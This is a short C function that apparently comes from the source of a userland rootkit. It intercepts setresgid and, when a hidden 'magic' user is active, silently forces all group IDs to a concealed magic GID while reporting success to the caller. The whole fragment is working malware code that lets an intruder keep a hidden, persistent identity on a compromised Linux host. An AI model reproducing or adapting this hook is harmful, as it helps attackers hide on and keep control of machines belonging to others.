int setresgid(gid_t rgid, gid_t egid, gid_t sgid){
    hook(CSETRESGID);
    if(magicusr()){
        gid_t magicgid = readgid();
        if(rgid != magicgid || egid != magicgid || sgid != magicgid)
            call(CSETRESGID, magicgid, magicgid, magicgid);
        return 0;
    }
    return (long)call(CSETRESGID, rgid, egid, sgid);
}
